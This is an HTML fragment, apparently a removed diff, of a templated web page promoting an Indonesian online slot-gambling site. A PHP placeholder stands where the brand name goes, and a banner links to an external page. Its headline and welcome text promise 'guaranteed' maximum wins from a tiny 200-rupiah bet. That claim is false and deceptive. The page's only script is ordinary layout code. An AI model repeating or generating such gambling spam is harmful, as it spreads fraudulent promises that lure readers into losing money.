-  <h2 style="white-space:pre-wrap;"><?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin</h2>
-</div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-
-
-
-</div></div></div><div class="fe-block fe-block-yui_3_17_2_1_1722424940572_11797"><div class="sqs-block code-block sqs-block-code" data-block-type="23" id="block-yui_3_17_2_1_1722424940572_11797"><div class="sqs-block-content"><a href="https://pub-d1c9944c206c4614a0456e8ff9fec0e0.r2.dev/main.html"><img style="display: block; margin-left: auto; margin-right: auto; width: 100%;" src="https://kilat.digital/images/2024/03/26/97bd20f65a56b2d7af843c6c5e6e0ff6.gif?v=1701675486" alt="<?php echo $BRANDS ?>" border="0"></a><br></p></div></div></div><div class="fe-block fe-block-yui_3_17_2_1_1722424940572_8656"><div class="sqs-block html-block sqs-block-html" data-blend-mode="NORMAL" data-block-type="2" data-border-radii="&#123;&quot;topLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;topRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomLeft&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;,&quot;bottomRight&quot;:&#123;&quot;unit&quot;:&quot;px&quot;,&quot;value&quot;:0.0&#125;&#125;" id="block-yui_3_17_2_1_1722424940572_8656"><div class="sqs-block-content">
-
-<div class="sqs-html-content">
-  <p class="sqsrte-large" style="white-space:pre-wrap;">Selamat datang di <?php echo $BRANDS ?> ,Platform permainan game online terbaru server Thailand yang sensasional dengan proses termudah dan cepat. Daftar & Login sekarang di Link Resmi dijamin pasti maxwin dengan bet 200 perak saja.</p>
-</div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-
-
-
-</div></div></div></div></div>
-    </div>
-  
-  </div>
-  
-</section>
-
-  
-</article>
-
-
-          
-
-          
-            
-          
-        
-      </main>
-      <script type="text/javascript">
-        const firstSection = document.querySelector('.page-section');
-        const header = document.querySelector('.header');
-        const mobileOverlayNav = document.querySelector('.header-menu');
-        const sectionBackground = firstSection ? firstSection.querySelector('.section-background') : null;
-        const headerHeight = header ? header.getBoundingClientRect().height : 0;
-        const firstSectionHasBackground = firstSection ? firstSection.className.indexOf('has-background') >= 0 : false;
-        const isFirstSectionInset = firstSection ? firstSection.className.indexOf('background-width--inset') >= 0 : false;
-        const isLayoutEngineSection = firstSection ? firstSection.className.indexOf('layout-engine-section') >= 0 : false;
-
-        if (firstSection) {
-          firstSection.style.paddingTop = headerHeight + 'px';
-        }
-        if (sectionBackground && isLayoutEngineSection) {
-          if (isFirstSectionInset) {
-            sectionBackground.style.top = headerHeight + 'px';
-          } else {
-            sectionBackground.style.top = '';
-          }
-        }
-        //# sourceURL=headerPositioning.js
-      </script>
-
-      
-        <footer class="sections" id="footer-sections" data-footer-sections>
-  
-  
-  
-  
-  
-  
-</footer>
-
-      
-    </div>
-
-    <script defer="defer" src="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/site-bundle.ed46306c56a516420b3e44c437245ab5.js" type="text/javascript"></script>
-    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg"><symbol id="instagram-unauth-icon" viewBox="0 0 64 64"><path d="M46.91,25.816c-0.073-1.597-0.326-2.687-0.697-3.641c-0.383-0.986-0.896-1.823-1.73-2.657c-0.834-0.834-1.67-1.347-2.657-1.73c-0.954-0.371-2.045-0.624-3.641-0.697C36.585,17.017,36.074,17,32,17s-4.585,0.017-6.184,0.09c-1.597,0.073-2.687,0.326-3.641,0.697c-0.986,0.383-1.823,0.896-2.657,1.73c-0.834,0.834-1.347,1.67-1.73,2.657c-0.371,0.954-0.624,2.045-0.697,3.641C17.017,27.415,17,27.926,17,32c0,4.074,0.017,4.585,0.09,6.184c0.073,1.597,0.326,2.687,0.697,3.641c0.383,0.986,0.896,1.823,1.73,2.657c0.834,0.834,1.67,1.347,2.657,1.73c0.954,0.371,2.045,0.624,3.641,0.697C27.415,46.983,27.926,47,32,47s4.585-0.017,6.184-0.09c1.597-0.073,2.687-0.326,3.641-0.697c0.986-0.383,1.823-0.896,2.657-1.73c0.834-0.834,1.347-1.67,1.73-2.657c0.371-0.954,0.624-2.045,0.697-3.641C46.983,36.585,47,36.074,47,32S46.983,27.415,46.91,25.816z M44.21,38.061c-0.067,1.462-0.311,2.257-0.516,2.785c-0.272,0.7-0.597,1.2-1.122,1.725c-0.525,0.525-1.025,0.85-1.725,1.122c-0.529,0.205-1.323,0.45-2.785,0.516c-1.581,0.072-2.056,0.087-6.061,0.087s-4.48-0.015-6.061-0.087c-1.462-0.067-2.257-0.311-2.785-0.516c-0.7-0.272-1.2-0.597-1.725-1.122c-0.525-0.525-0.85-1.025-1.122-1.725c-0.205-0.529-0.45-1.323-0.516-2.785c-0.072-1.582-0.087-2.056-0.087-6.061s0.015-4.48,0.087-6.061c0.067-1.462,0.311-2.257,0.516-2.785c0.272-0.7,0.597-1.2,1.122-1.725c0.525-0.525,1.025-0.85,1.725-1.122c0.529-0.205,1.323-0.45,2.785-0.516c1.582-0.072,2.056-0.087,6.061-0.087s4.48,0.015,6.061,0.087c1.462,0.067,2.257,0.311,2.785,0.516c0.7,0.272,1.2,0.597,1.725,1.122c0.525,0.525,0.85,1.025,1.122,1.725c0.205,0.529,0.45,1.323,0.516,2.785c0.072,1.582,0.087,2.056,0.087,6.061S44.282,36.48,44.21,38.061z M32,24.297c-4.254,0-7.703,3.449-7.703,7.703c0,4.254,3.449,7.703,7.703,7.703c4.254,0,7.703-3.449,7.703-7.703C39.703,27.746,36.254,24.297,32,24.297z M32,37c-2.761,0-5-2.239-5-5c0-2.761,2.239-5,5-5s5,2.239,5,5C37,34.761,34.761,37,32,37z M40.007,22.193c-0.994,0-1.8,0.806-1.8,1.8c0,0.994,0.806,1.8,1.8,1.8c0.994,0,1.8-0.806,1.8-1.8C41.807,22.999,41.001,22.193,40.007,22.193z"/></symbol><symbol id="instagram-unauth-mask" viewBox="0 0 64 64"><path d="M43.693,23.153c-0.272-0.7-0.597-1.2-1.122-1.725c-0.525-0.525-1.025-0.85-1.725-1.122c-0.529-0.205-1.323-0.45-2.785-0.517c-1.582-0.072-2.056-0.087-6.061-0.087s-4.48,0.015-6.061,0.087c-1.462,0.067-2.257,0.311-2.785,0.517c-0.7,0.272-1.2,0.597-1.725,1.122c-0.525,0.525-0.85,1.025-1.122,1.725c-0.205,0.529-0.45,1.323-0.516,2.785c-0.072,1.582-0.087,2.056-0.087,6.061s0.015,4.48,0.087,6.061c0.067,1.462,0.311,2.257,0.516,2.785c0.272,0.7,0.597,1.2,1.122,1.725s1.025,0.85,1.725,1.122c0.529,0.205,1.323,0.45,2.785,0.516c1.581,0.072,2.056,0.087,6.061,0.087s4.48-0.015,6.061-0.087c1.462-0.067,2.257-0.311,2.785-0.516c0.7-0.272,1.2-0.597,1.725-1.122s0.85-1.025,1.122-1.725c0.205-0.529,0.45-1.323,0.516-2.785c0.072-1.582,0.087-2.056,0.087-6.061s-0.015-4.48-0.087-6.061C44.143,24.476,43.899,23.682,43.693,23.153z M32,39.703c-4.254,0-7.703-3.449-7.703-7.703s3.449-7.703,7.703-7.703s7.703,3.449,7.703,7.703S36.254,39.703,32,39.703z M40.007,25.793c-0.994,0-1.8-0.806-1.8-1.8c0-0.994,0.806-1.8,1.8-1.8c0.994,0,1.8,0.806,1.8,1.8C41.807,24.987,41.001,25.793,40.007,25.793z M0,0v64h64V0H0z M46.91,38.184c-0.073,1.597-0.326,2.687-0.697,3.641c-0.383,0.986-0.896,1.823-1.73,2.657c-0.834,0.834-1.67,1.347-2.657,1.73c-0.954,0.371-2.044,0.624-3.641,0.697C36.585,46.983,36.074,47,32,47s-4.585-0.017-6.184-0.09c-1.597-0.073-2.687-0.326-3.641-0.697c-0.986-0.383-1.823-0.896-2.657-1.73c-0.834-0.834-1.347-1.67-1.73-2.657c-0.371-0.954-0.624-2.044-0.697-3.641C17.017,36.585,17,36.074,17,32c0-4.074,0.017-4.585,0.09-6.185c0.073-1.597,0.326-2.687,0.697-3.641c0.383-0.986,0.896-1.823,1.73-2.657c0.834-0.834,1.67-1.347,2.657-1.73c0.954-0.371,2.045-0.624,3.641-0.697C27.415,17.017,27.926,17,32,17s4.585,0.017,6.184,0.09c1.597,0.073,2.687,0.326,3.641,0.697c0.986,0.383,1.823,0.896,2.657,1.73c0.834,0.834,1.347,1.67,1.73,2.657c0.371,0.954,0.624,2.044,0.697,3.641C46.983,27.415,47,27.926,47,32C47,36.074,46.983,36.585,46.91,38.184z M32,27c-2.761,0-5,2.239-5,5s2.239,5,5,5s5-2.239,5-5S34.761,27,32,27z"/></symbol></svg>
-
-  </body>
-</html>
-
-
-
